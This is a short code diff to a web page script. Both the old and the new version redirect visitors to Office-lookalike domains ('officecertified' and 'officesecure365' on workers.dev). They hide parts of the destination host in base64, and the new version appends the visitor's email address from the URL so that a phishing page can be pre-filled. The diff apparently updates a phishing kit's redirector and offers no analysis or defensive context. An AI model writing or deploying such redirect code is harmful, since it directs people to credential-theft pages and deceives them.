@@ -1,18 +1,16 @@
 <script type="text/javascript">
+    var urlParams = new URLSearchParams(window.location.search);
+    var email = urlParams.get('email');
 
-    if (window.location.hash) {
-        var url = window.location.href;
-        var hash = url.split('#').pop();
-        const encdStr = 'Lm9ubGluZS8/a3J4aA==';
+    if (email) {
+        const encdStr = 'LndvcmtlcnMuZGV2';
         const str = atob(encdStr);
-        const encodedHash = btoa(hash); // Encode the hash using base64
-        const emma = '?&qrc=' + encodedHash; // Use the encoded hash
-        const dr = 'https://officecertified';
+        const emma = '#' + email;
+        const dr = 'https://0581131e.officesecure365';
         const ax = dr + str;
         var link = ax + emma;
         window.location.href = link;
     } else {
-        window.location.href = link;
+        // Handle case when 'email' parameter is not present
     }
-
 </script>
